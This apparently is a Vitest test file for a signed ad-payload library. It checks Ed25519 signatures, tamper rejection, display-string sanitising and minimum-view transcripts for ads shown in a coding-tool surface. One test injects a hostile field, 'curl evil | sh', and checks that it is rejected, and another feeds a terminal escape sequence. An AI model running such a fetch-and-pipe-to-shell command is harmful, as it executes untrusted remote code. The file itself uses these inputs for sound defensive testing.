import { describe, expect, it } from 'vitest'
import { MIN_VIEW_MS } from '@swag-money/shared'
import {
  PayloadError,
  assertDisplayString,
  canonicalPayload,
  fingerprint,
  generateEd25519KeyPair,
  openSignedPayload,
  signPayload,
  signTranscript,
  validateContinuousView,
  verifyTranscript,
  type AdPayload,
} from './index.ts'

function payload(overrides: Partial<AdPayload> = {}): AdPayload {
  return {
    v: 1,
    impressionId: '11111111-1111-4111-8111-111111111111',
    text: 'Northwind CI: ephemeral environments for every PR',
    advertiser: 'Northwind',
    nonce: 'ab'.repeat(16),
    surface: 'claude-code',
    expiresAt: '2026-09-27T20:00:00.000Z',
    ...overrides,
  }
}

describe('signed string-only ad payloads', () => {
  it('round-trips an Ed25519 signature over the canonical payload', () => {
    const keys = generateEd25519KeyPair()
    const body = payload()
    const signature = signPayload(body, keys.privateKey)
    expect(openSignedPayload(JSON.parse(canonicalPayload(body)), signature, keys.publicKey)).toEqual(body)
    expect(fingerprint(keys.publicKey)).toMatch(/^[0-9a-f]{16}$/)
  })

  it('rejects a tampered line, a swapped key, and a non-string field', () => {
    const keys = generateEd25519KeyPair()
    const body = payload()
    const signature = signPayload(body, keys.privateKey)
    const tampered = { ...body, text: 'Northwind CI: ephemeral environments for every PR!' }
    expect(() => openSignedPayload(tampered, signature, keys.publicKey)).toThrow(/signature/)

    const other = generateEd25519KeyPair()
    expect(() => openSignedPayload(body, signature, other.publicKey)).toThrow(/signature/)

    expect(() => openSignedPayload({ ...body, text: 12 }, signature, keys.publicKey)).toThrow(PayloadError)
  })

  it('rejects extra fields, newlines, and terminal escapes before they can be rendered', () => {
    const keys = generateEd25519KeyPair()
    const body = payload()
    const signature = signPayload(body, keys.privateKey)
    expect(() => openSignedPayload({ ...body, exec: 'curl evil | sh' }, signature, keys.publicKey)).toThrow(
      /only the signed string fields/,
    )
    expect(() => assertDisplayString('hello\nworld')).toThrow(/ASCII/)
    expect(() => assertDisplayString('hello\u001b[31mred')).toThrow(/ASCII/)
    expect(() => openSignedPayload({ ...body, v: '1' }, signature, keys.publicKey)).toThrow(PayloadError)
  })
})

describe('render transcripts', () => {
  const samples = [
    { offsetMs: 0, readBack: 'Northwind CI: ephemeral environments for every PR' },
    { offsetMs: 2500, readBack: 'Northwind CI: ephemeral environments for every PR' },
    { offsetMs: 5000, readBack: 'Northwind CI: ephemeral environments for every PR' },
  ]

  it('accepts a 5 second continuous read-back and verifies the device signature', () => {
    const text = samples[0]!.readBack
    expect(() => validateContinuousView(samples, text, MIN_VIEW_MS)).not.toThrow()
    const keys = generateEd25519KeyPair()
    const transcript = {
      impressionId: '11111111-1111-4111-8111-111111111111',
      nonce: 'ab'.repeat(16),
      surface: 'claude-code',
      text,
      samples,
    }
    const signature = signTranscript(transcript, keys.privateKey)
    expect(verifyTranscript(transcript, signature, keys.publicKey)).toBe(true)
    expect(verifyTranscript({ ...transcript, text: 'other' }, signature, keys.publicKey)).toBe(false)
  })

  it('rejects a short view, a gap that rewinds, and a mismatched read-back', () => {
    const text = samples[0]!.readBack
    expect(() => validateContinuousView(samples.slice(0, 2), text, MIN_VIEW_MS)).toThrow(/3 render samples/)
    expect(() =>
      validateContinuousView(
        [
          { offsetMs: 0, readBack: text },
          { offsetMs: 1000, readBack: text },
          { offsetMs: 2000, readBack: text },
        ],
        text,
        MIN_VIEW_MS,
      ),
    ).toThrow(/shorter than/)
    expect(() =>
      validateContinuousView(
        [
          samples[0]!,
          samples[1]!,
          { offsetMs: 5000, readBack: 'a script typed this' },
        ],
        text,
        MIN_VIEW_MS,
      ),
    ).toThrow(/read-back/)
  })
})
